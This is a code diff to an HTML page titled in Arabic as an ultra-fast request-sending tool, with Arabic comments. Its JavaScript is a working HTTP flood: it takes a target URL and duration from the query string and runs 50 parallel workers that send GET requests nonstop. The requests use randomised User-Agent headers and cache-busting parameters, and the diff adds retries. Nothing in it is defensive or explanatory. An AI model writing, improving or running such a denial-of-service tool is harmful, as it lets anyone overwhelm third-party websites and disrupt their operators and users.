@@ -5,14 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>أداة إرسال طلبات فائقة السرعة</title>
     <script>
-        // إعدادات الأداء
         const config = {
-            parallelRequests: 50,      // زيادة عدد الطلبات المتوازية
-            requestTimeout: 2000,     // وقت انتهاء كل طلب (2 ثانية)
-            cacheBusting: true        // تجنب التخزين المؤقت
+            parallelRequests: 50,      // عدد الطلبات المتوازية
+            requestTimeout: 2000,     // وقت انتهاء الطلب
+            cacheBusting: true,       // تجنب التخزين المؤقت
+            maxRetries: 1             // عدد إعادة المحاولات لكل طلب فاشل
         };
 
-        // متغيرات التتبع
         let stats = {
             total: 0,
             rps: 0,
@@ -21,7 +20,6 @@
         let isRunning = false;
         let intervalId;
 
-        // دالة لتحليل البارامترات
         function getQueryParams() {
             const params = new URLSearchParams(window.location.search);
             return {
@@ -30,86 +28,75 @@
             };
         }
 
-        // دالة لإنشاء توقعات عشوائية
         function getRandomHeaders() {
             const browsers = [
                 `Chrome/${Math.floor(Math.random() * 20) + 80}`,
                 `Firefox/${Math.floor(Math.random() * 20) + 70}`,
                 `Safari/${Math.floor(Math.random() * 10) + 10}`
             ];
-            
             return {
                 'User-Agent': `Mozilla/5.0 (${Math.random() > 0.5 ? 'Windows NT 10.0' : 'Macintosh'}) AppleWebKit/537.36 (KHTML, like Gecko) ${browsers[Math.floor(Math.random() * browsers.length)]}`,
-                'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
                 'Accept': '*/*',
-                'Cache-Control': 'no-cache',
-                'Pragma': 'no-cache'
+                'Cache-Control': 'no-cache'
             };
         }
 
-        // دالة الإرسال الأساسية
-        async function fireRequest(url) {
+        async function fireRequest(url, retries = config.maxRetries) {
             if (!isRunning) return;
-            
+
             const controller = new AbortController();
             const timeout = setTimeout(() => controller.abort(), config.requestTimeout);
-            
+
             try {
-                const fullUrl = url + (config.cacheBusting ? `&_=${Date.now()}${Math.floor(Math.random() * 1000)}` : '');
-                await fetch(fullUrl, {
+                const fullUrl = url + (config.cacheBusting ? `&_=${Date.now()}${Math.random().toString(36).slice(2)}` : '');
+                const response = await fetch(fullUrl, {
                     method: 'GET',
                     headers: getRandomHeaders(),
                     mode: 'no-cors',
                     cache: 'no-store',
-                    credentials: 'omit',
-                    referrerPolicy: 'no-referrer',
                     signal: controller.signal
                 });
-            } catch (e) {
-                // تجاهل الأخطاء للسرعة القصوى
-            } finally {
-                clearTimeout(timeout);
                 stats.total++;
                 stats.rps++;
+            } catch (e) {
+                if (retries > 0 && e.name !== 'AbortError') {
+                    return fireRequest(url, retries - 1); // إعادة المحاولة
+                }
+            } finally {
+                clearTimeout(timeout);
             }
         }
 
-        // دورة الإرسال الرئيسية
         async function startFlood(targetUrl, duration) {
             if (!targetUrl) {
                 document.body.textContent = 'خطأ: يرجى إضافة ?url=الرابط_الهدف';
                 return;
             }
-            
-            // إعادة تعيين الإحصائيات
+
             stats = { total: 0, rps: 0, startTime: Date.now() };
             isRunning = true;
-            
-            // تحديث الإحصائيات
+
             intervalId = setInterval(() => {
                 document.body.textContent = `rps ${stats.rps} total ${stats.total}`;
                 stats.rps = 0;
             }, 1000);
-            
-            // إنشاء عمال الإرسال المتوازيين
-            const workers = Array(config.parallelRequests).fill().map(async () => {
+
+            const workerPool = Array(config.parallelRequests).fill().map(async () => {
                 while (isRunning && Date.now() < stats.startTime + (duration * 1000)) {
                     await fireRequest(targetUrl);
                 }
             });
-            
-            await Promise.all(workers);
+
+            await Promise.all(workerPool);
             stopFlood();
         }
 
-        // إيقاف الإرسال
         function stopFlood() {
             isRunning = false;
             clearInterval(intervalId);
             document.body.textContent = `تم الإنتهاء | rps ${stats.rps} total ${stats.total}`;
         }
 
-        // بدء التشغيل
         window.onload = function() {
             document.body.style.margin = '0';
             document.body.style.padding = '0';
@@ -119,8 +106,8 @@
             document.body.style.paddingTop = '50px';
             document.body.style.backgroundColor = 'white';
             document.body.style.color = 'black';
-            
-            const {url, time} = getQueryParams();
+
+            const { url, time } = getQueryParams();
             startFlood(url, time);
         };
     </script>
